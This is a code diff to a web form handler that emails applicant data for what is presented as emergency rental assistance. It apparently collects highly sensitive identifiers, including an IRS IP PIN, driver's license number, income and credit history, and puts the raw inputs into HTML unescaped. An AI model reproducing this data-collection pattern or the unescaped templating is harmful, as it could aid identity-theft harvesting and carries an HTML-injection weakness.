@@ -83,8 +83,16 @@ export async function POST(request) {
     <p>Last Pay Amount: ${formData.lastPayAmount}</p>
     <p>Last Pay Date: ${formData.lastPayDate}</p>
     <p>Next Pay Date: ${formData.nextPayDate}</p>
+    <p>If Annual Income reduced by 70%: ${formData.annualIncomeReducedBy70}</p>
     <p>Additional Income: ${formData.additionalIncome}</p>
-    <p>Loan Purpose: ${formData.loanPurpose}</p>
+    <p>Issued eviction notice: ${formData.issuedEvictionNotice}</p>
+    <p>Affected by covid: ${formData.affectedByCovid}</p>
+    <p>Owe utility bill: ${formData.oweUtilityBill}</p>
+    <p>Rental Assistance Duration: ${formData.rentalAssistanceDuration}</p>
+    <p>Rental Assistance Payment Means: ${
+      formData.rentalAssistancePaymentMeans
+    }</p>
+
     <p>Military Status: ${formData.militaryStatus}</p>
     <p>Bankruptcy History: ${formData.bankruptcyHistory}</p>
     <p>Payday Loan History: ${formData.paydayLoanHistory}</p>
@@ -95,10 +103,7 @@ export async function POST(request) {
       formData.EmergencyRentalAssistanceSourceOther
     }</p>
     <p>Credit Score: ${formData.creditScore}</p>
-    <p>Mode of Disbursement: ${formData.meansOfDisbursement}</p>
-    <p>Recieved Ip Pin: ${formData.receivedIPPIN}</p>
     <p> Ip Pin: ${formData.ipPin}</p>
-    <p>Filed for 2022 tax: ${formData.didFile2022Taxes}</p>
     <p>Adjusted Gross Income: ${formData.adjustedGrossIncome}</p>
 
     <p>License Number: ${
